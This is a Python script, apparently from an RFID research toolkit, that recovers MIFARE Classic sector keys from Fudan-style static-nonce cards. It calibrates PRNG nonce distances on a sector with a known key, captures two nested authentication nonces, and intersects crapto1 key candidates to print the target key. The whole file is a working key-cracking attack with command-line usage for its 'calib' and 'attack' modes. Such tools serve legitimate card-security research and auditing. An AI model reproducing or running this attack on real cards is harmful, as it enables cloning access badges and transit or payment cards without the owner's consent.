#!/usr/bin/env python3
"""Plain static-nonce cards (Fudan, first nonce always e.g. 01200145): nested at two distances.

The PRNG restarts at each select and steps per auth, not with time: a nested nonce sits a fixed
distance after the first one (160 here), the next nested one 160 further. One nested capture gives
the same (nt, ks) every time -- not enough to pin the key -- so the second capture first completes a
nested auth into the known sector, then asks for the target: its nonce lands at the second distance.
Event-based stepping makes host round-trip timing irrelevant. Both distances are calibrated on a
sector with a known key (decrypt its nested nonce), then the two target nonces intersect to the key.

Usage: staticnonce.py HOST calib KNOWN_SECTOR KEY
       staticnonce.py HOST attack KNOWN_SECTOR KEY TARGET_SECTOR a|b D1 D2
"""
import sys

import chipmon
import crapto1
import mfc
from crypto1 import Crypto1, auth_answer, prng_successor
from rawa import crc_a

NRAR_CODE = 0x78  # 72-bit {nr}{ar} in bit mode (docs/NOTES.md); mfc.pack's 0x90 truncates it


def distance(a, b):
    """PRNG steps from nonce a to nonce b, or None."""
    x = a
    for i in range(65536):
        if x == b:
            return i
        x = prng_successor(x, 1)
    return None


def cmd(c, b):
    a = bytes([c, b])
    return a + crc_a(a)


def first_auth(s, block, key, kb):
    """Select + first auth; returns (nt, cipher after {at}) or None."""
    s.parity(True)
    if s.select() is None:
        return None
    s.parity(False)
    frame, code = mfc.pack(cmd(0x61 if kb else 0x60, block))
    s.mon.frames()
    r = s.mon.auth(key, int.from_bytes(s.uid, "big"), 0x12345678, frame, code)
    if not r:
        return None
    nt, odd, even = r
    s.nfc.drain(100)
    fr = s.mon.frames()
    if len(fr) < 2:
        return None
    c = Crypto1.from_state(odd, even)
    at = int.from_bytes(c.decrypt(mfc.unpack(fr[-1][1], 0, 4)[0]), "big")
    return (nt, c) if at == prng_successor(nt, 96) else None


def nested_enc(s, c, ncmd):
    """Send an encrypted nested AUTH; returns the encrypted nonce or None."""
    enc, par = c.encrypt(ncmd)
    raw, off = s.ptx(enc, par)
    if not raw:
        return None
    b, _ = mfc.unpack(raw, off, 4)
    return int.from_bytes(b, "big") if len(b) == 4 else None


def capture1(s, kblock, key, kb, tblock, tb, tries=6):
    """First nested nonce via on-chip OP_NESTED: (nt0, enc_nt) or None."""
    frame, code = mfc.pack(cmd(0x61 if kb else 0x60, kblock))
    uid = int.from_bytes(s.uid, "big")
    for _ in range(tries):
        s.parity(True)
        if s.select() is None:
            continue
        s.parity(False)
        s.mon.frames()
        nt0 = s.mon.nested(key, uid, 0x12345678, frame, code, cmd(0x61 if tb else 0x60, tblock))
        if nt0 is None:
            continue
        fr = s.mon.frames()
        if not fr:
            continue
        b, _ = mfc.unpack(fr[-1][1], 4, 4)
        if len(b) == 4:
            return nt0, int.from_bytes(b, "big")
    return None


def capture2(s, kblock, key, kb, tblock, tb, tries=6):
    """Second nested nonce: first auth, a complete nested auth into the known sector, then the
    target's nested AUTH. Returns (nt0, enc_nt) or None."""
    uid = int.from_bytes(s.uid, "big")
    for _ in range(tries):
        a = first_auth(s, kblock, key, kb)
        if a is None:
            continue
        nt0, c = a
        e = nested_enc(s, c, cmd(0x61 if kb else 0x60, kblock))
        if e is None:
            continue
        nt = e ^ Crypto1(key).word(uid ^ e, encrypted=True)
        c2, nrar, par, at = auth_answer(key, uid, nt, 0x12345678)
        fifo, _ = mfc.pack(nrar, par)
        fr = s.tx(fifo, NRAR_CODE)
        if not fr or int.from_bytes(c2.decrypt(mfc.unpack(fr[-1][1], 0, 4)[0]), "big") != at:
            continue
        e = nested_enc(s, c2, cmd(0x61 if tb else 0x60, tblock))
        if e is not None:
            return nt0, e
    return None


def main():
    host, mode = sys.argv[1], sys.argv[2]
    ksec, key = int(sys.argv[3]), bytes.fromhex(sys.argv[4])
    s = mfc.Session(host)
    if not s.start():
        print("start failed (no card?)")
        return 1
    uid = int.from_bytes(s.uid, "big")
    print(f"UID {s.uid.hex()} SAK {s.sak:02x}")
    kblock = mfc.first_block(ksec)

    if mode == "calib":
        tblock = mfc.first_block(ksec + 1)  # target: next sector, same (known) key
        for name, cap in (("1 nested", capture1), ("2 nested", capture2)):
            ds = []
            for _ in range(4):
                r = cap(s, kblock, key, 0, tblock, 0)
                if r is None:
                    ds.append("fail")
                    continue
                nt0, enc = r
                nt = enc ^ Crypto1(key).word(uid ^ enc, encrypted=True)
                ds.append(f"nt0={nt0:08x} ntT={nt:08x} D={distance(nt0, nt)}")
            print(f"{name}: " + " | ".join(ds))
        return 0

    tsec, tb = int(sys.argv[5]), sys.argv[6].lower() == "b"
    d1, d2 = int(sys.argv[7]), int(sys.argv[8])
    tblock = mfc.first_block(tsec)
    got = []
    for dist, cap in ((d1, capture1), (d2, capture2)):
        r = cap(s, kblock, key, 0, tblock, tb)
        if r is None:
            print(f"capture at distance {dist} failed")
            return 1
        nt0, enc = r
        nt = prng_successor(nt0, dist)
        got.append((nt, enc ^ nt))
        print(f"D={dist}: nt0={nt0:08x} predicted ntT={nt:08x} enc={enc:08x}")
    (nt1, ks1), (nt2, ks2) = got
    for k in crapto1.recover_keys(uid, nt1, ks1):
        if Crypto1(k.to_bytes(6, "big")).word(uid ^ nt2) == ks2:
            print(f"recovered key {'AB'[tb]} sector {tsec}: {k:012x}")
            return 0
    print("no key (distances off?)")
    return 1


if __name__ == "__main__":
    sys.exit(main())
